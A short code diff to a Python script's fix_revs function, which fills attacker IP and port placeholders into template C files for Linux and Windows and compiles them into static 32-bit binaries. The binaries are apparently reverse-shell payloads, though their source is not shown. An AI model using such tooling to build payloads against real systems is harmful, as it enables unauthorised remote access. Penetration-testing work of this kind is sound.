@@ -85,15 +85,20 @@ def run_t(ip):
 
 def fix_revs():
     global IP, PORT
-    files = ["custom_linux_rev"]
+    files = [".linux.c", ".windows.c"]
     for file in files:
-        new_file = file.replace("custom_", "")
-        cmd = f"sed 's/CUSTOMIPADDRESS/{IP}/g' {file} > .{new_file}"
-        os.system(cmd)
-        cmd = f"sed 's/CUSTOMPORT/{PORT}/g' .{new_file} > {new_file}"
-        os.system(cmd)
-        os.system(f"chmod +x {new_file}")
-        os.system(f"rm .{new_file}")
+        with open(file, "r") as f:
+            c = f.read()
+        c = c.replace("PORT", PORT)
+        c = c.replace("IPADDRESS", IP)
+        
+        new_file = file[1:]
+        binary = new_file[:-2]
+        with open(new_file, "w") as f:
+            f.write(c)
+
+        os.system(f"gcc {new_file} -o {binary} -static -m32")
+        
         
                 
 
